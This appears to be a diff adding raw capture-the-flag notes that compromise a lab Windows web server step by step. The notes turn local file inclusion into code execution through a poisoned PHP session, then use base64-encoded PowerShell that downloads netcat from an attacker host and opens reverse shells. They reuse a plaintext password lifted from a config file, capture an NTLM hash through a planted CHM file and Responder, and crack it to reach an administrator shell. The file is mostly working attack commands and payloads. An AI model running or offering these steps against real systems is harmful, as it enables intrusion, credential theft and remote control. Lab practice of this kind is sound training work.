@@ -1,0 +1,47 @@
+http://10.10.10.151/user/
+http://10.10.10.151/blog
+http://10.10.10.151/blog/?lang=blog-en.php	//LFI
+http://10.10.10.151/blog/?lang=/windows/win.ini
+curl-X GET http://10.10.10.151/blog/?lang=/windows/win.ini
+
+//LFI to RCE
+//Register user, login, get cookie and go to the session file location
+curl-X GET http://10.10.10.151/blog/?lang=/windows/temp/sess_923nktm0vmmi12qrptls332t5o
+
+<?=`powershellwhoami`?>		//this as user, to get RCE, repeat curl
+//got some characters banned, so:
+echo whoami | iconv -t utf-16le | base64
+<?=`powershell /enc dwBoAG8AYQBtAGkACgA=`?>
+echo"wget http://10.10.14.23/nc.exe -o C:\\Windows\\TEMP\\nc.exe" | iconv -t UTF-16LE | base64
+<?=`powershell/encdwBnAGUAdAAgAGgAdAB0AHAAOgAvAC8AMQAwAC4AMQAwAC4AMQA0AC4AMgAzAC8AbgBjAC4AZQB4AGUAIAAtAG8AIABDADoAXABXAGkAbgBkAG8AdwBzAFwAVABFAE0AUABcAG4AYwAuAGUAeABlAAoA`?>
+nc -lvp1234	//got shell as iusr, now we need to get Chris's
+//C:\inetpub\wwwroot\user\db.php  pass "36mEAhz/B8xQ~2VM"
+
+$password = convertto-securestring -AsPlainText -Force-String "36mEAhz/B8xQ~2VM";
+$credential = new-object -typename System.Management.Automation.PSCredential -argumentlist "SNIPER\chris",$password;
+Invoke -Command- ComputerName LOCALHOST -ScriptBlock{whoami} -credential $credential;
+
+Invoke -Command -ComputerName LOCALHOST -ScriptBlock { wget http://10.10.14.23/nc.exe -o C:\Users\chris\nc.exe } -credential $credential;
+Invoke -Command -ComputerName LOCALHOST -ScriptBlock { C:\Users\chris\nc.exe -e cmd.exe 10.10.14.23 4444 } -credential $credential;
+//got chris's shell
+
+C:\Docs\	//message, in C:\Users\chris\Downloads we find instructions.chm Admin might expect a chm file in C:\docs
+//HTML Help Workshop to create the file (on windows)
+//create the following file instructions.html
+<html>
+	<body>
+		<imgsrc=\\10.10.14.23\share\abc.png/>
+	</body>
+</html>
+
+//In HTML Help Workshop. create project, include instructions.html and compile
+wget http://10.10.14.23/instructions.chm -o C:\Users\chris\instructions.chm	//in Chris
+
+python Responder.py -I tun0	//linux
+copy C:\Users\chris\instructions.chm C:\Docs
+hashcat -m 5600--force hash.txt rockyou.txt	//get pass butterfly!#1
+nc -lvp 5555
+
+$password = convertto -securestring -AsPlainText -Force-String "butterfly!#1";
+$credential = new-object -typenameSystem.Management.Automation.PSCredential -argumentlist "SNIPER\Administrator",$password;
+Invoke -Command -ComputerName LOCALHOST -ScriptBlock { C:\Users\chris\nc.exe -e cmd.exe 10.10.14.23 5555 } -credential $credential;	//got shell as admin
